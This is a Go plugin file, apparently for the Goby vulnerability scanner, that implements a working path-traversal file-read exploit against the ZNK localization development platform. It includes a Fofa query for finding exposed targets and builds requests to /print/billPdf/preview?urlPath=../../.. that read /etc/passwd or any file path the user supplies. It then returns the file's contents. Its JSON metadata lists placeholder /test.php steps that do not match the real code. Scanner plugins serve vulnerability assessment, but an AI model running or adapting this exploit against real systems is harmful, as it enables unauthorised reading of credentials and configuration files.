package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "ZNK localization development platform /print/billPdf/preview File Read Vulnerability",
    "Description": "<p>A file reading vulnerability exists in the path of the ZNK localization platform /print/billPdf/preview, which can be read by an attacker through the urlPath interface, leading to the leakage of sensitive files.</p>",
    "Product": "ZNK",
    "Homepage": "http://www.znk.group",
    "DisclosureDate": "2024-07-18",
    "PostTime": "2024-08-02",
    "Author": "maweixuan@baimaohui.net",
    "FofaQuery": "title=\"ZNK 国产化开发\" && body=\"<link rel=icon id=iconLink href=u523.png>\"",
    "GobyQuery": "title=\"ZNK 国产化开发\" && body=\"<link rel=icon id=iconLink href=u523.png>\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>please pay attention to themanufacturer's homepage update.</p><p>If not necessary, prohibit public network access to the system.</p><p><a href=\"http://www.znk.group\">http://www.znk.group</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Linux",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "HW-2024",
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.3",
    "Translation": {
        "CN": {
            "Name": "真内控国产化开发平台 /print/billPdf/preview 文件读取漏洞",
            "Product": "真内控国产化平台",
            "Description": "<p>真内控国产化平台 /print/billPdf/preview 路径存在文件读取漏洞，攻击者可通过 urlPath 接口进行文件读取，从而导致敏感文件泄露等<br></p>",
            "Recommendation": "<p>请用户联系⼚商修复漏洞</p><p>如非必要，禁止公网访问该系统<br></p><p><a href=\"http://www.znk.group\">http://www.znk.group</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "HW-2024",
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ZNK localization development platform /print/billPdf/preview File Read Vulnerability",
            "Product": "ZNK",
            "Description": "<p>A file reading vulnerability exists in the path of the ZNK localization platform /print/billPdf/preview, which can be read by an attacker through the urlPath interface, leading to the leakage of sensitive files.<br></p>",
            "Recommendation": "<p>please pay attention to themanufacturer's homepage update.<br></p><p>If not necessary, prohibit public network access to the system.<br></p><p><a href=\"http://www.znk.group\">http://www.znk.group</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "HW-2024",
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10985"
}`

	postOrGet_opvuioaefi := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		//发送get请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/print/billPdf/preview?urlPath=../../../../../../../../../../../../../.." + fileUrl

		resp, err := setGetRequest(hostInfo, path, map[string]string{})
		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),

		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 此处需要修改：设置成功后的vulurl

			vulURL := "/print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd"

			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件

			defaultModeMap := map[string]string{
				"/etc/passwd": "root",
			}

			// 函数继承

			uploadFileFunc := postOrGet_opvuioaefi

			// 请注意：后续代码为模板代码，非特殊情况，无需更改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			for fileUrl, fileText := range defaultModeMap {

				resp, err := uploadFileFunc(u, fileUrl)

				if err != nil {

					continue

				}

				if strings.Contains(resp, fileText) {

					// 设置VULURL

					ss.VulURL = u.HostInfo + vulURL

					return true

				}

			}

			return false

		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			var fileUrl string

			var fileText string

			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件

			defaultModeMap := map[string][2]string{

				"passwd": {"/etc/passwd", "root"},
			}

			// 此处需要修改：函数继承

			uploadFileFunc := postOrGet_opvuioaefi

			// 请注意，后续代码为模板固化，正常情况下均无需修改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			if mode == "Customize" {

				fileUrl = goutils.B2S(ss.Params["Linux"])

			} else {

				if _, ok := defaultModeMap[mode]; ok {

					fileUrl = defaultModeMap[mode][0]

					fileText = defaultModeMap[mode][1]

				} else {

					expResult.Success = false

					return expResult

				}

			}

			// 获取返回结果url和返回请求头

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)

			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {

				expResult.Success = false

				return expResult

			}

			expResult.Success = true

			expResult.Output = resp

			return expResult

		},
	))

}
